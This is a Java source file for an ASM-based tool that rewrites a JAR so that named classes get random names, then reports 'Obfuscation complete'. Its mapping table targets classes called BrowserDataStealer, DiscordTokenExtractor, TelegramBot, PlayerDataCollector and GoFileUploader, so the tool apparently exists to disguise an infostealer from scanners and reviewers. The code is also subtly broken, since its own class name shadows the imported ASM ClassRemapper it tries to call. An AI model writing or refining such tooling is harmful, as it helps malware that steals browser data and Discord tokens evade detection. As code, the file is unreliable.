
import org.objectweb.asm.*;
import org.objectweb.asm.commons.*;
import java.io.*;
import java.util.*;
import java.util.jar.*;

public class ClassRemapper {
    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.err.println("Usage: ClassRemapper <input.jar> <output.jar>");
            System.exit(1);
        }
        
        Map<String, String> mappings = new HashMap<>();
        mappings.put("a/b/c/BrowserDataStealer", "a/b/c/Ajiowejfio");
        mappings.put("a/b/c/DiscordTokenExtractor", "a/b/c/Bzklmznxcv");
        mappings.put("a/b/c/TelegramBot", "a/b/c/Cqwpoierty");
        mappings.put("a/b/c/PlayerDataCollector", "a/b/c/Dmnbvcxzas");
        mappings.put("a/b/c/GoFileUploader", "a/b/c/Epoilkjhgf");

        
        File input = new File(args[0]);
        File output = new File(args[1]);
        
        try (JarFile jarFile = new JarFile(input);
             JarOutputStream jos = new JarOutputStream(new FileOutputStream(output))) {
            
            Enumeration<JarEntry> entries = jarFile.entries();
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                
                try (InputStream is = jarFile.getInputStream(entry)) {
                    if (name.endsWith(".class") && !name.startsWith("META-INF/")) {
                        // Remap class
                        ClassReader cr = new ClassReader(is);
                        ClassWriter cw = new ClassWriter(0);
                        
                        Remapper remapper = new Remapper() {
                            @Override
                            public String map(String internalName) {
                                return mappings.getOrDefault(internalName, internalName);
                            }
                        };
                        
                        ClassRemapper cv = new ClassRemapper(cw, remapper);
                        cr.accept(cv, ClassReader.EXPAND_FRAMES);
                        
                        byte[] bytes = cw.toByteArray();
                        
                        // Get new entry name
                        String className = name.substring(0, name.length() - 6);
                        String newName = mappings.getOrDefault(className, className) + ".class";
                        
                        JarEntry newEntry = new JarEntry(newName);
                        newEntry.setTime(entry.getTime());
                        jos.putNextEntry(newEntry);
                        jos.write(bytes);
                    } else {
                        // Copy as-is
                        JarEntry newEntry = new JarEntry(name);
                        newEntry.setTime(entry.getTime());
                        jos.putNextEntry(newEntry);
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = is.read(buffer)) > 0) {
                            jos.write(buffer, 0, len);
                        }
                    }
                    jos.closeEntry();
                } catch (Exception e) {
                    System.err.println("Error processing " + name + ": " + e.getMessage());
                }
            }
        }
        
        System.out.println("✅ Obfuscation complete: " + output.getName());
    }
}
